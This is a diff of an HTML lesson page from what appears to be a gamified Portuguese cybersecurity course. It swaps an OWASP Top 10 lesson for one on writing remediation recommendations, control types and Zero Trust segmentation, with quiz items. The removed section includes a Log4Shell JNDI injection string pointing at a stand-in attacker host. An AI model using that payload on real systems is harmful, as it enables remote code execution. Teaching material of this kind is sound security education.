@@ -9,14 +9,14 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - O Padrão OWASP Top 10</title>
+    <title>CyberDuo - Achados, Recomendações e Controles de Remediação</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --cyber-blue: #00f2ff;
+            --cyber-blue: #00ffa3;
             --cyber-green: #00ff41;
             --cyber-red: #ff003c;
             --cyber-yellow: #ffb800;
@@ -95,8 +95,8 @@
         .game-footer { flex-shrink: 0; padding: 1rem 1rem max(1rem, env(safe-area-inset-bottom)); background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
         .check-btn { width: 100%; max-width: 400px; padding: 1rem; border-radius: 1rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 1rem; letter-spacing: 1px; transition: all 0.1s; -webkit-tap-highlight-color: transparent; }
         .check-btn:active { transform: scale(0.98); }
-        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #00a8b3; }
-        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #00a8b3; }
+        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #00b372; }
+        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #00b372; }
 
         /* FEEDBACK OVERLAY */
         .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem 1.5rem max(1.5rem, env(safe-area-inset-bottom)); transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: left; }
@@ -110,7 +110,7 @@
 <body>
 
     <div class="game-header">
-        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-06.html'"><i class="fas fa-times"></i></div>
+        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-09.html'"><i class="fas fa-times"></i></div>
         <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
         <div class="hearts" id="heartsContainer"></div>
     </div>
@@ -131,120 +131,76 @@
         const steps = [
             {
                         "type": "teach",
+                        "icon": "fa-screwdriver-wrench",
+                        "title": "Boa Recomendação Precisa Ser Executável (Cisco 9.2.1)",
+                        "content": "Descobertas devem terminar com <b>ações de remediação claras</b>. Não basta escrever 'corrigir'. O relatório precisa indicar o que mudar, em qual camada, qual risco reduz e, quando possível, qual prioridade aplicar.",
+                        "highlight": "Achado útil sempre aponta um caminho de correção."
+            },
+            {
+                        "type": "teach",
                         "icon": "fa-shield-halved",
-                        "title": "O que é OWASP Top 10?",
-                        "content": "O <b>OWASP Top 10</b> é o documento de conscientização mais crítico para segurança de aplicações web. Ele lista os 10 riscos de segurança mais graves e comuns a cada três anos. Historicamente, a falha A03 refere-se a Injeção. Diferente da Autenticação (quem é você), a Autorização verifica o que você pode acessar. Uma falha clássica do Top 10 é a A03 Injeção."
+                        "title": "Controles Técnicos, Administrativos, Operacionais e Físicos (Cisco 9.2.2)",
+                        "content": "As recomendações podem envolver <b>controles técnicos</b> como MFA, hardening e parametrização de consultas; <b>controles administrativos</b> como RBAC e políticas; <b>controles operacionais</b> como treinamento e segregação de funções; e <b>controles físicos</b> como mantraps, câmeras e biometria.",
+                        "highlight": "Nem toda correção é tecnológica; muitas dependem de processo e governança."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-network-wired",
+                        "title": "Zero Trust e Redução de Movimento Lateral (Cisco 9.2.2)",
+                        "content": "A Cisco destaca o uso de <b>microsegmentação Zero Trust</b> para controlar tráfego leste-oeste próximo à carga de trabalho. Isso limita o movimento lateral e melhora a contenção quando uma máquina ou aplicação é comprometida.",
+                        "highlight": "Segmentar perto da aplicação reduz blast radius."
             },
             {
                         "type": "example",
-                        "icon": "fa-book-open",
-                        "title": "A Bíblia da Segurança",
-                        "scenario": "Se uma empresa vai auditar seu sistema ou treinar seus desenvolvedores, o OWASP Top 10 é sempre o guia inicial obrigatório usado no mundo inteiro.",
-                        "takeaway": "Saber o Top 10 é o requisito mínimo para trabalhar com AppSec."
-            },
-            {
-                        "type": "quiz",
-                        "task": "Qual a principal utilidade do OWASP Top 10 no mercado de trabalho?",
-                        "options": [
-                                    "É um padrão da indústria que define os riscos de segurança mais críticos em aplicações web.",
-                                    "É um antivírus gratuito de código aberto.",
-                                    "É um software que corrige bugs automaticamente em Java."
-                        ],
-                        "correctText": "É um padrão da indústria que define os riscos de segurança mais críticos em aplicações web.",
-                        "explanation": "Empresas exigem conhecimento no Top 10 em entrevistas de segurança."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-lock-open",
-                        "title": "Broken Access Control",
-                        "content": "A falha número 1 atual. <b>Quebra de Controle de Acesso</b> ocorre quando o sistema não checa corretamente se o usuário tem permissão para fazer uma ação ou ver um dado."
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-user-ninja",
-                        "title": "Virando Admin",
-                        "scenario": "O usuário comum muda a URL do painel de `painel/user` para `painel/admin`. O sistema deixa ele entrar sem verificar se ele tem a role de administrador.",
-                        "takeaway": "Nunca confie no lado do cliente (frontend) para definir permissões."
-            },
-            {
-                        "type": "fill",
-                        "sentence": "A falha de Broken Access Control se baseia no princípio de que a aplicação falhou em aplicar as regras de ___ do usuário.",
-                        "options": [
-                                    "Autorização",
-                                    "Autenticação",
-                                    "Criptografia"
-                        ],
-                        "correctText": "Autorização",
-                        "explanation": "Autenticação é provar QUEM você é. Autorização é O QUE você pode fazer."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-pen-ruler",
-                        "title": "A04: Design Inseguro",
-                        "content": "Vulnerabilidades decorrentes de falhas na arquitetura e no modelo de ameaça. Não podem ser corrigidas por código seguro se o <i>design</i> original já é falho (ex: perguntas de recuperação de senha fáceis de adivinhar).",
-                        "highlight": "Design inseguro não tem patch de código"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-sliders",
-                        "title": "A05: Configuração de Segurança Incorreta",
-                        "content": "Sistemas mantidos com configurações padrão, diretórios abertos, mensagens de erro detalhadas (stack traces) expostas, ou serviços desnecessários habilitados.",
-                        "highlight": "Remova padrões e feche o que não usa"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-box-open",
-                        "title": "A06: Componentes Vulneráveis e Desatualizados",
-                        "content": "Usar bibliotecas de terceiros, frameworks ou servidores web que possuem falhas conhecidas (CVEs). A aplicação herda as vulnerabilidades das suas dependências.",
-                        "highlight": "A maioria do código nas aplicações web vem de terceiros"
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "Falha Log4j (Componente Vulnerável)",
-                        "scenario": "A biblioteca Java Log4j tinha uma vulnerabilidade RCE crítica (Log4Shell). Milhões de aplicações que usavam Log4j sem atualizar foram comprometidas.",
-                        "code": "O atacante envia uma string especial no header User-Agent: \n${jndi:ldap://atacante.com/exploit}",
-                        "takeaway": "Mantenha dependências atualizadas sempre!"
-            },
-            {
-                        "type": "quiz",
-                        "task": "Uma aplicação web que exibe mensagens de erro com stack trace do banco de dados na tela do usuário sofre de qual falha do OWASP Top 10?",
-                        "options": [
-                                    "A05: Configuração de Segurança Incorreta",
-                                    "A01: Quebra de Controle de Acesso",
-                                    "A03: Injeção"
-                        ],
-                        "correctText": "A05: Configuração de Segurança Incorreta",
-                        "explanation": "A exposição de erros detalhados ajuda os atacantes a mapear o backend e é uma falha de configuração."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-id-badge",
-                        "title": "A07: Falhas de Identificação e Autenticação",
-                        "content": "Antigamente 'Broken Authentication'. Envolve falhas no login: permitir senhas fracas, ausência de MFA, não invalidar sessões após o logout, exposição do ID de sessão.",
-                        "highlight": "Autenticação falha = roubo de contas"
+                        "icon": "fa-code",
+                        "title": "Exemplo - Recomendação para SQL Injection",
+                        "scenario": "Após validar uma falha de SQL Injection em um formulário de cobrança, o relatório técnico pode orientar a correção de forma objetiva:",
+                        "code": "Achado: entrada 'invoice_id' aceita payload SQL arbitrário.\nRecomendação técnica: implementar consultas parametrizadas e validação server-side.\nRecomendação administrativa: incluir revisão de segurança no SDLC.\nPrioridade: alta, por risco de vazamento financeiro.",
+                        "takeaway": "Uma remediação forte combina correção técnica imediata com prevenção de recorrência."
             },
             {
                         "type": "match",
-                        "title": "OWASP → Descrição",
+                        "title": "Associe o Controle ao Exemplo",
                         "pairs": [
                                     {
-                                                "term": "A01 Controle de Acesso",
-                                                "definition": "Usuário faz o que não deve"
+                                                "term": "Técnico",
+                                                "definition": "MFA, hardening e consultas parametrizadas"
                                     },
                                     {
-                                                "term": "A02 Falhas Criptográficas",
-                                                "definition": "Dados em trânsito/repouso sem proteção"
+                                                "term": "Administrativo",
+                                                "definition": "RBAC, política de senha e Secure SDLC"
                                     },
                                     {
-                                                "term": "A03 Injeção",
-                                                "definition": "Input executado como comando"
+                                                "term": "Operacional",
+                                                "definition": "Treinamento, férias obrigatórias e job rotation"
                                     },
                                     {
-                                                "term": "A06 Componentes Vulneráveis",
-                                                "definition": "Uso de bibliotecas com CVEs conhecidos"
+                                                "term": "Físico",
+                                                "definition": "Biometria, câmeras e mantraps"
                                     }
                         ]
+            },
+            {
+                        "type": "quiz",
+                        "task": "Qual recomendação reduz melhor o risco de movimento lateral após o comprometimento de uma carga de trabalho?",
+                        "options": [
+                                    "Aplicar microsegmentação alinhada a uma arquitetura Zero Trust",
+                                    "Aumentar apenas o tamanho do storage do servidor",
+                                    "Remover os logs para melhorar a performance da aplicação"
+                        ],
+                        "correctText": "Aplicar microsegmentação alinhada a uma arquitetura Zero Trust",
+                        "explanation": "A microsegmentação restringe o tráfego entre cargas de trabalho e reduz o impacto de uma intrusão."
+            },
+            {
+                        "type": "fill",
+                        "sentence": "Para impedir que dados de entrada sejam executados como comandos SQL, o relatório deve recomendar a ___ das consultas.",
+                        "options": [
+                                    "parametrização",
+                                    "compressão",
+                                    "replicação"
+                        ],
+                        "correctText": "parametrização",
+                        "explanation": "Consultas parametrizadas separam dados de instruções SQL e reduzem o risco de injeção."
             }
 ];
 
@@ -526,15 +482,15 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/6.10-configuracao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/9.2b-comunicacao-pos-entrega.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
-                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #00a8b3; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #00b372; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             }
 
             document.getElementById('gameArea').innerHTML = `
                 <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                     <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">Você concluiu esta lição e dominou os conceitos apresentados.</h2>
+                    <h2 class="title-main mb-2">REMEDIAÇÃO MAPEADA!</h2>
                     <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
@@ -543,7 +499,7 @@
                                 <i class="fas fa-rotate-right mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">REINICIAR</span>
                             </button>
-                            <button class="check-btn" onclick="window.location.href='../modules/modulo-06.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
+                            <button class="check-btn" onclick="window.location.href='../modules/modulo-09.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
                                 <i class="fas fa-layer-group mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">MÓDULOS</span>
                             </button>
